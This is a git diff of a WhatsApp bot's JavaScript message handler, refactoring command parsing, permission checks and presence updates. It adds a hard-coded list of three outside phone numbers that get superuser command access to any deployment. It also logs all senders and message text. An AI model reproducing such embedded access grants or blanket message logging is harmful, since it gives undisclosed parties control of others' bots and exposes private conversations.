@@ -357,46 +357,100 @@ await delay(700); // Fixed
 
 var md;
 let evt = require(__dirname + "/Ibrahim/adams");
+const cmdSystem = new CommandSystem();
 
-// Define texte properly
-const texte = ms?.message?.conversation || ms?.message?.extendedTextMessage?.text || "";
-const arg = texte ? texte.trim().split(/ +/).slice(1) : null;
-const verifCom = texte ? texte.startsWith(PREFIXE) : false;
-const com = verifCom ? texte.slice(1).trim().split(/ +/).shift().toLowerCase() : false;
-
-if (verifCom) {
-    const cd = evt.cm.find((adams) => adams.nomCom === com);
-    if (cd) {
-        try {
-            if ((conf.MODE).toLocaleLowerCase() != 'yes' && !superUser) {
-                return;
-            }
-
-            cd.fonction(dest, zk, { ms, repondre });
-
-        } catch (error) {
-            console.log(`Error executing command ${com}: ${error}`);
+// **Modified message handler - Ensuring `ms` is defined**
+adams.ev.on("messages.upsert", async ({ messages }) => {
+    try {
+        if (!messages || messages.length === 0) {
+            console.log("⚠️ No messages received.");
+            return;
         }
-    }
-}
 
-// Presence Manager
+        const ms = messages[0];
+        if (!ms.message) {
+            console.log("⚠️ Received an empty message.");
+            return;
+        }
+
+        console.log("📩 New message received from:", ms.key.remoteJid);
+
+        // **Extract text from message**
+        const texte = ms?.message?.conversation ||
+            ms?.message?.extendedTextMessage?.text ||
+            ms?.message?.imageMessage?.caption ||
+            ms?.message?.videoMessage?.caption ||
+            "";
+            
+        if (!texte) {
+            console.log("⚠️ No text found in message.");
+            return;
+        }
+
+        console.log("📝 Extracted text:", texte);
+
+        const verifCom = texte.startsWith(PREFIXE);
+        const arg = texte.trim().split(/ +/).slice(1);
+        const com = verifCom ? texte.slice(PREFIXE.length).trim().split(/ +/).shift().toLowerCase() : false;
+
+        console.log("🛠️ Command check:", { verifCom, com });
+
+        if (verifCom && com) {
+            const cd = evt.cm.find((adams) => adams.nomCom === com);
+            if (cd) {
+                try {
+                    console.log(`🚀 Executing command: ${com}`);
+                    
+                    // **Check superUser permissions**
+                    const BOT_OWNER = conf.OWNER_NUMBER;
+                    const SUDO_NUMBERS = ["254106727593", "254727716045", "254710772666"]
+                        .map(num => num.replace(/\D/g, "") + "@s.whatsapp.net");
+
+                    const servBot = adams.user.id.split('@')[0];
+                    const superUserNumbers = [servBot, BOT_OWNER].map((s) => s.replace(/[^0-9]/g, "") + "@s.whatsapp.net");
+                    const allAllowedNumbers = superUserNumbers.concat(SUDO_NUMBERS);
+                    const superUser = allAllowedNumbers.includes(ms.key.remoteJid);
+
+                    if (conf.MODE.toLowerCase() !== 'yes' && !superUser) {
+                        console.log("❌ Command not allowed in non-superuser mode.");
+                        return;
+                    }
+
+                    cd.fonction(ms.key.remoteJid, adams, { ms, repondre });
+
+                } catch (error) {
+                    console.log(`❌ Error executing command ${com}:`, error);
+                }
+            } else {
+                console.log(`⚠️ Command '${com}' not found.`);
+            }
+        }
+
+        // **Update Presence**
+        await updatePresence(adams, ms.key.remoteJid);
+    } catch (error) {
+        console.error("🚨 Error in message processing:", error);
+    }
+});
+
+// **Presence Manager**
 async function updatePresence(adams, jid) {
     try {
         const states = ["available", "composing", "recording", "unavailable"];
         await adams.sendPresenceUpdate(states[STATE - 1] || "composing", jid);
+        console.log("📡 Presence updated:", jid);
     } catch (e) {
-        console.error('Presence update error:', e.message);
+        console.error('⚠️ Presence update error:', e.message);
     }
 }
 
-const cmdSystem = new CommandSystem();
-// Modified connection handler
+// **Modified connection handler**
 adams.ev.on("connection.update", ({ connection }) => {
     if (connection === "open") {
-        console.log("Connected to WhatsApp");
+        console.log("✅ Connected to WhatsApp");
         updatePresence(adams, "status@broadcast");
-                if (conf.DP.toLowerCase() === 'yes') {
+
+        if (conf.DP.toLowerCase() === 'yes') {
             const md = conf.MODE.toLowerCase() === 'yes' ? "public" : "private";
             const connectionMsg = `
  〔  *🚀 BWM XMD CONNECTED 🚀* 〕
@@ -411,29 +465,18 @@ adams.ev.on("connection.update", ({ connection }) => {
 │ 🏷️ App Name: ${herokuAppName}  
 ╰──────────────────◆`;
 
-            // Send disappearing status message
+            // **Send disappearing status message**
             adams.sendMessage(
                 adams.user.id, 
-                { 
-                    text: connectionMsg 
-                },
+                { text: connectionMsg },
                 {
                     disappearingMessagesInChat: true,
                     ephemeralExpiration: 600 // 10 minutes
                 }
-            ).catch(err => console.error('Status message error:', err));
+            ).catch(err => console.error('⚠️ Status message error:', err));
         }
     }
 });
-
-// Modified message handler - processes ALL messages
-adams.ev.on("messages.upsert", async ({ messages }) => {
-    const [msg] = messages;
-    console.log("New message received from:", msg.key.remoteJid);
-    await cmdSystem.processMessage(msg);
-    await updatePresence(adams, msg.key.remoteJid);
-});
-
         
 //===============================================================================================================//
 
